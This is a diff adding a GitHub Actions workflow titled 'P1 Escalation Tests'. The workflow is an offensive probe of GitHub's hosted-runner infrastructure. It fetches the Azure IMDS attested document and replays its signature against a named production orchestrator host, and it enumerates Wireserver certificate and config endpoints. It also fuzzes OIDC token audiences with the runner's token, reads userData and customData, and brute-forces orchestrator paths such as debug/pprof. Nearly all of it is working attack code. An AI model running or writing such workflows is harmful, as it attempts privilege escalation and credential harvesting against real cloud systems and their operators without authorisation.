@@ -1,0 +1,130 @@
+name: P1 Escalation Tests
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "1. IMDS Attested Document (HIGHEST PRIORITY)"
+        run: |
+          echo "=== Getting IMDS Attested Document ==="
+          ATTESTED=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01&nonce=$(date +%s)")
+          echo "$ATTESTED" | jq .
+          
+          SIGNATURE=$(echo "$ATTESTED" | jq -r '.signature')
+          echo ""
+          echo "=== Signature (base64 PKCS7) first 200 chars ==="
+          echo "${SIGNATURE:0:200}..."
+          
+          echo ""
+          echo "=== Try Orchestrator with Attested Document ==="
+          BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          
+          # Try as X-Attestation header
+          curl -s -w "\nHTTP: %{http_code}\n" \
+            -H "X-Attestation: $SIGNATURE" \
+            -H "X-Attestation-Provider: imds" \
+            "$BASE/vm/v1" | head -20
+          
+          # Try as Authorization header  
+          curl -s -w "\nHTTP: %{http_code}\n" \
+            -H "Authorization: Attestation $SIGNATURE" \
+            "$BASE/vm/v1" | head -20
+          
+          # Try POST with attestation body
+          curl -s -w "\nHTTP: %{http_code}\n" -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"attestation\": \"$SIGNATURE\", \"provider\": \"imds\"}" \
+            "$BASE/vm/v1" | head -20
+          
+          curl -s -w "\nHTTP: %{http_code}\n" -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"attestation\": \"$SIGNATURE\"}" \
+            "$BASE/vm/v1/attest" | head -20
+
+      - name: "2. Azure Wireserver Probe"
+        run: |
+          echo "=== Probing Wireserver 168.63.129.16 ==="
+          
+          for ENDPOINT in \
+            "/" \
+            "/machine" \
+            "/machine?comp=goalstate" \
+            "/machine?comp=config" \
+            "/machine?comp=certificates" \
+            "/machine?comp=health" \
+            "/health"; do
+            echo "--- http://168.63.129.16$ENDPOINT ---"
+            curl -s --connect-timeout 3 -H "x-ms-version: 2012-11-30" \
+              "http://168.63.129.16$ENDPOINT" 2>&1 | head -10 || echo "timeout/error"
+          done
+
+      - name: "3. OIDC Audience Fuzzing"
+        run: |
+          echo "=== Testing OIDC Token Audiences ==="
+          
+          for AUD in \
+            "api://hosted-compute" \
+            "api://hosted-compute-rw" \
+            "api://actions-runner" \
+            "api://github-actions" \
+            "https://vstoken.actions.githubusercontent.com" \
+            "https://pipelines.actions.githubusercontent.com"; do
+            echo "--- Audience: $AUD ---"
+            RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" 2>&1)
+            TOKEN=$(echo "$RESP" | jq -r '.value' 2>/dev/null)
+            if [ "$TOKEN" != "null" ] && [ -n "$TOKEN" ]; then
+              echo "SUCCESS: Got token for $AUD"
+              echo "Token: ${TOKEN:0:80}..."
+            else
+              echo "Failed: $(echo "$RESP" | jq -r '.error // .message // "unknown"' 2>/dev/null)"
+            fi
+          done
+
+      - name: "4. Additional IMDS Endpoints"
+        run: |
+          echo "=== Scheduled Events ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" | jq .
+          
+          echo ""
+          echo "=== Load Balancer ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01" | jq .
+          
+          echo ""
+          echo "=== User Data ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text" | base64 -d 2>/dev/null | head -50 || echo "No userData or decode failed"
+          
+          echo ""
+          echo "=== Custom Data ==="
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text" | base64 -d 2>/dev/null | head -50 || echo "No customData"
+
+      - name: "5. Orchestrator Endpoint Fuzzing"
+        run: |
+          BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          
+          echo "=== Fuzzing Orchestrator Endpoints ==="
+          for PATH in \
+            "/" \
+            "/health" \
+            "/healthz" \
+            "/ready" \
+            "/readyz"  \
+            "/metrics" \
+            "/api" \
+            "/api/v1" \
+            "/v1" \
+            "/vm" \
+            "/vm/v1/allocations" \
+            "/vm/v1/vms" \
+            "/vm/v1/pools" \
+            "/debug" \
+            "/debug/pprof" \
+            "/swagger.json" \
+            "/openapi.json"; do
+            echo -n "$PATH: "
+            curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$BASE$PATH" || echo "error"
+            echo ""
+          done
